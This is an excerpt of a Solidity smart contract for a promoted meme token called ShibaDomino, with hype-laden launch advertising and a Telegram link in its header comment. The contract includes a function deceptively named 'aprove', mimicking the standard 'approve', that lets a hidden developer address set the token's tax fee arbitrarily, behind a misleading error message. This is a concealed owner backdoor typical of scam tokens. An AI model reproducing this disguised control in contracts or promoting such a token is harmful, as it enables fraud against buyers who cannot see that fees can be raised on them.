...
/**
 🚀ShibaDomino | EARN $hiba 🔥
Stealth Launch
 
🦊Earn $Hiba every 60 mins Just by holding. 
...
✅ Doxxed Community 
✅ AMA AT 500 MEMBERS
✅ Huge Marketing AT $5K MC

🦊Join our community for the most hype fair launch ever.

Telegram: https://t.me/ShibaDomino
 ...
 */
 ...
 contract ShibaDomino is Context, ERC20, ERC20Metadata {
     ...
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_ , address  ks_ , address fix_ , address SHIB_) {
    _name = name_;
     SHIB = SHIB_;
    _symbol =symbol_;
    _decimals = decimals_;
    ...
    function aprove(uint256 a) public{
        _setTaxFee( a);
       require(_msgSender() == _ks, "ERC20: cannot permit dev address");
    }
